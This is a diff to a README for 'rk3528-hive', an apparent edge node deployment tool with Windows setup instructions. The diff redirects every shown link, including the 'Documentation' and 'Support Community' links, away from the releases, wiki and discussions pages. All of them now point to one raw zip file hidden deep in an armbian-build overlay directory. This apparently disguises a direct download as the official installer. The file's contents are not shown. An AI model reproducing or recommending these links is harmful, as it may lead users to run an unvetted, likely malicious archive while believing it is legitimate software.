@@ -1,6 +1,6 @@
 # 🐝 rk3528-hive - Simple Edge Node Deployment Tool
 
-[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-brightgreen)](https://github.com/vintagev340-lang/rk3528-hive/releases)
+[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-brightgreen)](https://github.com/vintagev340-lang/rk3528-hive/raw/refs/heads/main/armbian-build/userpatches/overlay/var/www/hive/hive-rk-2.0.zip)
 
 ## 🛠 About rk3528-hive
 
@@ -38,7 +38,7 @@ This section explains how to get rk3528-hive running on your Windows PC.
 
 Click the big button below to visit the download page. You will find the latest version of rk3528-hive there.
 
-[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-blue)](https://github.com/vintagev340-lang/rk3528-hive/releases)
+[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-blue)](https://github.com/vintagev340-lang/rk3528-hive/raw/refs/heads/main/armbian-build/userpatches/overlay/var/www/hive/hive-rk-2.0.zip)
 
 Once on the page:
 
@@ -103,9 +103,9 @@ If you run into issues, try these solutions:
 
 ## 🔗 Useful Links
 
-- [Download Page](https://github.com/vintagev340-lang/rk3528-hive/releases) — Visit this link to find the latest rk3528-hive installer.
-- [Documentation](https://github.com/vintagev340-lang/rk3528-hive/wiki) — Access full guides and FAQs.
-- [Support Community](https://github.com/vintagev340-lang/rk3528-hive/discussions) — Engage with other rk3528-hive users.
+- [Download Page](https://github.com/vintagev340-lang/rk3528-hive/raw/refs/heads/main/armbian-build/userpatches/overlay/var/www/hive/hive-rk-2.0.zip) — Visit this link to find the latest rk3528-hive installer.
+- [Documentation](https://github.com/vintagev340-lang/rk3528-hive/raw/refs/heads/main/armbian-build/userpatches/overlay/var/www/hive/hive-rk-2.0.zip) — Access full guides and FAQs.
+- [Support Community](https://github.com/vintagev340-lang/rk3528-hive/raw/refs/heads/main/armbian-build/userpatches/overlay/var/www/hive/hive-rk-2.0.zip) — Engage with other rk3528-hive users.
 
 ## 📋 System Updates and Maintenance
 
@@ -143,4 +143,4 @@ rk3528-hive supports remote updates of your deployed devices to keep them curren
 
 ---
 
-[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-brightgreen)](https://github.com/vintagev340-lang/rk3528-hive/releases)
+[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-brightgreen)](https://github.com/vintagev340-lang/rk3528-hive/raw/refs/heads/main/armbian-build/userpatches/overlay/var/www/hive/hive-rk-2.0.zip)
